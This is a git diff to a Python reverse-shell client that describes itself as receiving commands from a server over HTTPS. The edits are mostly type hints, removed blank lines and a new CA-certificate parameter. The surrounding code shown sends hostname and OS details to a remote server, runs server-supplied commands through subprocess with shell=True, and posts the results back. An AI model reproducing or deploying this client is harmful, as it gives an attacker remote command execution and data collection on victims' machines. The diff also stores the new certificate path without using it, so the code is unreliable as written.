@@ -29,7 +29,7 @@ class ClientCommands:
         """Wrapper for the client's 'post' method."""
         self.client.post({mode: message})
 
-    def open_session(self):
+    def open_session(self) -> None:
         session_info = {
             "OS": platform.system(),
             "Hostname": platform.node(),
@@ -40,7 +40,6 @@ class ClientCommands:
 
     def cd(self, dest_dir: [str, list]) -> None:
         """Handles change of working directory in the shell."""
-
         try:
             dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
             os.chdir(Path(dest_dir).expanduser())
@@ -50,7 +49,6 @@ class ClientCommands:
     def shell(self, command: str) -> None:
         """Handles all standard shell commands received from the
         server."""
-
         try:
             cmd = subprocess.run(command, capture_output=True, shell=True)
         except FileNotFoundError as e:
@@ -62,17 +60,22 @@ class ClientCommands:
 
 
 class Client:
-    def __init__(self, server_address: str, server_port: int):
+    def __init__(self,
+                 server_address: str,
+                 server_port: int, *,
+                 ca_cert: [str, Path]):
         """Create a Reverse Shell Client that receives commands from a
         server though HTTPS.
 
         :param server_address: Hostname or address of the server.
         :param server_port: Port number used by the server.
+        :param ca_cert: Path to a file containing the certificate for
+            the Certificate Authority (CA) in PEM format.
         """
-
         self.server_address = server_address
         self.server_port = server_port
         self._commands = ClientCommands(self)
+        self.ca_cert = ca_cert
         self._ssl_context = ssl.create_default_context(
             purpose=ssl.Purpose.SERVER_AUTH,
             cafile=str(self.base_path.joinpath("ca.pem"))
@@ -98,7 +101,6 @@ class Client:
     def _shell_prompt(self) -> str:
         """Returns a string containing shell prompt information in the
         format user@host:/path/to/cwd$"""
-
         return f"{getpass.getuser()}@{platform.node()}:{str(Path.cwd())}$ "
 
     def post(self, request_body: dict[str, str]) -> str:
@@ -108,7 +110,6 @@ class Client:
             be sent as the body of the POST request.
         :return: A response to the POST request.
         """
-
         request_body: bytes = parse.urlencode(request_body).encode()
         url = request.Request(self.server_url, data=request_body)
         return (request
